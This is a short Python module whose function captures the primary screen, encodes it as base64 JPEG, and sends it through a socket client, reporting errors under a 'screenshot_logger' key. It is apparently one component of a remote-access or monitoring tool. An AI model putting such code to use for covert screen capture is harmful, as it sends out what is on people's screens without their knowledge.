from PIL import Image
import mss
import io
import base64

def send_screenshot(client, converter):
    try:
        screenshot_base64 = None
        with mss.mss() as sct:
            screenshot = sct.grab(sct.monitors[1])
            img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)

            img = img.convert("RGB")
            
            buffer = io.BytesIO()
            img.save(buffer, format="JPEG", quality=70)
            screenshot_data = buffer.getvalue()

            screenshot_base64 = base64.b64encode(screenshot_data).decode("utf-8")
            
        if screenshot_base64:
            client.emit('message', converter.encode({"screenshot": screenshot_base64}))
    except Exception as e:
        client.emit('message', converter.encode({"screenshot_logger": str(e)}))
